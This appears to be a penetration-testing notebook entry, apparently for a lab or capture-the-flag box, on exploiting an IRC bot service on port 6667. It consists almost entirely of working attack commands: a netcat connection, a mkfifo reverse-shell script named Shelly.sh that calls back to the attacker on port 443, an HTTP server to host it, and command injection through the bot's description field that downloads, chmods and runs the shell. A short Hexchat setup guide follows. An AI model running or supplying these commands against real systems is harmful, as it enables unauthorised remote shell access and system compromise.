```bash - kali
nc -nvv $TARGET 6667
```
If getting disconnects with this method, try [[Port 6667 - IRC#Hexchat]].
```bash - kali
nick kali
```
```bash - kali
user kali 8 * kali
```
```bash - kali
list
```
```bash - kali
join #mailAssistant
```
```bash - kali
privmsg spaghetti_BoT !command
```
```bash - kali
privmsg spaghetti_BoT !about
```
Shelly.sh
```bash - kali
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 443 >/tmp/f
```
```bash - kali
python3 -m http.server 80
```
![[1._rlwrap]]
```bash - kali
privmsg spaghetti_BoT email:kali@kali.lan description:test |wget $KALI:80/Shelly.sh
```
```bash - kali
privmsg spaghetti_BoT email:kali@kali.lan description:test |chmod +x Shelly.sh
```
```bash - kali
privmsg spaghetti_BoT email:kali@kali.lan description:test |./Shelly.sh
```
#### Hexchat
```bash - kali
sudo apt-get install hexchat
```
Add > Edit
![[Pasted image 20220320171011.png]]
Once connected, go to Server > Channel list.
Enter a wildcard i the search bar and hit search.
* May have to decrease the "channels with" value to 1.
![[Pasted image 20220320171419.png]]